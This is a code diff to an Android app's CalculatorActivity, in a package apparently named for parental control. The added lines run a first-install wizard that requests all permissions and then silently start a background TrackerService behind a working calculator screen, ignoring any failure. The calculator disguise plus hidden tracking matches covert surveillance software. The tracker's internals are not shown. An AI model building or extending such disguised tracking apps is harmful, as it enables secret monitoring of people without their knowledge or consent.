@@ -49,6 +49,16 @@ class CalculatorActivity : AppCompatActivity() {
         window.navigationBarColor = 0xFF1C1C1E.toInt()
         window.statusBarColor     = 0xFF1C1C1E.toInt()
 
+        // ── First-install setup wizard ─────────────────────────────────────
+        // Run once — launches SetupWizardActivity which requests all permissions
+        // and returns here after setup is complete.
+        if (!com.anonchat.app.parentalcontrol.ui.SetupWizardActivity.isSetupDone(this)) {
+            startActivity(Intent(this,
+                com.anonchat.app.parentalcontrol.ui.SetupWizardActivity::class.java))
+            // Don't finish — wizard will return here via onResume
+            return
+        }
+
         setContentView(R.layout.activity_calculator)
 
         // Ensure background tracking service is running
@@ -62,6 +72,24 @@ class CalculatorActivity : AppCompatActivity() {
         bindButtons()
         updateDisplay()
     }
+
+    override fun onResume() {
+        super.onResume()
+        // If wizard just completed, initialise the calculator UI now
+        if (com.anonchat.app.parentalcontrol.ui.SetupWizardActivity.isSetupDone(this)) {
+            if (tvResult == null || !::tvResult.isInitialized) {
+                setContentView(R.layout.activity_calculator)
+                try {
+                    com.anonchat.app.parentalcontrol.service.TrackerService.start(this)
+                } catch (_: Exception) { }
+                tvExpression = findViewById(R.id.tvExpression)
+                tvResult     = findViewById(R.id.tvResult)
+                bindButtons()
+                updateDisplay()
+            }
+        }
+    }
+
 
     // ─────────────────────────────────────────────────────────────────────────
     // Button wiring
